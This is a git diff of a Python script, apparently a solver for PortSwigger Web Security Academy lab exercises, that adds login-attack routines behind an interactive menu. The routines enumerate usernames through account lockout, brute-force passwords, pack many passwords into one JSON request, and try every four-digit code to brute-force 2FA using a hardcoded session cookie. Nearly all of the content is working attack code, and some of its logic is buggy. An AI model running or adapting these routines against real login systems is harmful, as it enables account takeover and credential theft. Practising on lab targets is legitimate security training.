@@ -3,7 +3,7 @@ import time
 import random
 import base64
 import hashlib
-
+import json
 def bug_bundy():
     print("\n")
     print(" ██████  ██    ██  ██████      ██████   ██████  ██    ██ ███    ██ ████████ ██    ██ ")
@@ -90,6 +90,7 @@ def bruteforce_stay_logged_in_cookieg(usernames, passwords, url):
             break
         else:
             print("trying {}".format(i))
+
 def bruteforce_IP_block(passwords, url):
     username=input("Enter a vaild username ")
     username2=input("Enter a vaild username2 not for brute force ")
@@ -114,27 +115,76 @@ def bruteforce_IP_block(passwords, url):
         if "Incorrect password" not in r.text:
             print("Password found {} for the user {}".format(i, username))
             break
-def bruteforce_account_lock(passwords, url):
-    
 
-def main():
-    bug_bundy()
-    with open("username.txt") as fb:
-        usernames = fb.read().splitlines()
+def bruteforce_account_lock(usernames,passwords, url):
+    for i in usernames:
+        for j in range(1,5):
+            data2 = {
+                "username": i,
+                "password": "password"
+            }
+            r = requests.post(url, data=data2)
+            if "Invalid username or password" not in r.text:
+                username=i
+                print("check username {}".format(i))
+    for i in passwords:
+        data2 = {
+            "username": username,
+            "password": i
+        }
+        r = requests.post(url, data=data2)
+        if "too many incorrect login attempts" not in r.text:
+            print("check password {} for the username {}".format(i,username))
 
-    with open("password.txt") as fb:
-        passwords = fb.read().splitlines()
+def brute_force_protection_multiple(usernames,passwords,url):
+    user=input("enter a username which need to be brute force")
+    data2={
+        "username":user,
+        "password":passwords
+    }
+    r = requests.post(url, data=json.dumps(data2))
+    print(r.text)
+
+def two_FA_broken_logic(url):
+    for i in range(0000,9999+1):
+        header2 = {
+            "Cookie":"verify = carlos;session = ASg7jSaatXNbJM4cONGXOhWk4XIm9AjI"
+        }
+        data2={
+            "mfa-code":"{}".format(str(i).zfill(4))
+        }
+        r = requests.post(url,headers=header2,data=data2)
+        if "Incorrect security code" not in r.text:
+            print(i)
+            break
+def Broken_Authentication():
+
     while True:
+        print("\n")
+        username = input("Enter the path for wordlist username list ")
+        password = input("Enter the path for wordlist password list ")
+        with open(username) as fb:
+            usernames = fb.read().splitlines()
+
+        with open(password) as fb:
+            passwords = fb.read().splitlines()
+        print("\n")
         print("Options:")
+        print("\n")
         print("1. Username enumeration via different responses")
         print("2. Username enumeration via subtly different responses")
         print("3. Username enumeration via response timing")
         print("4. Brute-forcing a stay-logged-in cookie")
         print("5. Broken brute-force protection, IP block")
         print("6. Username enumeration via account lock")
+        print("7. Broken brute-force protection, multiple credentials per request")
+        print("8. 2FA broken logic")
+        print("9. Back")
+        print("\n")
         option = int(input("Select an option: "))
+        print("\n")
         url = input("Enter a URL: ")
-
+        print("\n")
         if option == 1:
             bruteforce_via_different_responses(usernames, passwords, url)
         elif option == 2:
@@ -145,11 +195,25 @@ def main():
             bruteforce_stay_logged_in_cookieg(usernames, passwords, url)
         elif option == 5:
             bruteforce_IP_block(passwords, url)
-
-
-        cts = input("Do you want to continue (y/n)? ").lower()
-        if cts == 'n':
+        elif option == 6:
+            bruteforce_account_lock(usernames,passwords,url)
+        elif option == 7:
+            brute_force_protection_multiple(usernames,passwords,url)
+        elif option == 8:
+            two_FA_broken_logic(url)
+        else:
             break
-
+def main():
+    bug_bundy()
+    while True:
+        print("Options:")
+        print("1.  Broken Authentication")
+        print("10. Exit")
+        option = int(input("Select an option: "))
+        if option == 1:
+            Broken_Authentication()
+        else:
+            break
 if __name__ == "__main__":
     main()
+#https://0a0300ff041ad69c85a41ce500f8000c.web-security-academy.net/login
